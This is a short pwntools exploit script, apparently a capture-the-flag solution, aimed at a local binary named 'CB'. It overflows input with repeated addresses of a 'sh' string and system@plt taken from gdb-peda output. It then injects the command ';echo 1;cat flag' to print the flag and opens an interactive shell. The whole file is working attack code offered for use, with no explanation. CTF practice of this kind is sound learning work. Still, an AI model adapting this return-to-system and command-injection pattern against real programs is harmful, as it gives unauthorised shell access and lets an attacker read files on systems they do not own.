from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')

'''
gdb-peda$ p &sh
$1 = (<data variable, no debug info> *) 0x804a024 <sh>
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0x8048340 <system@plt>
'''
sh = 0x804a024
system = 0x8048340

s.send('a')
s.send((p32(sh)+p32(sh)+p32(system)+p32(sh))*(256/12))

s.sendline(";echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()

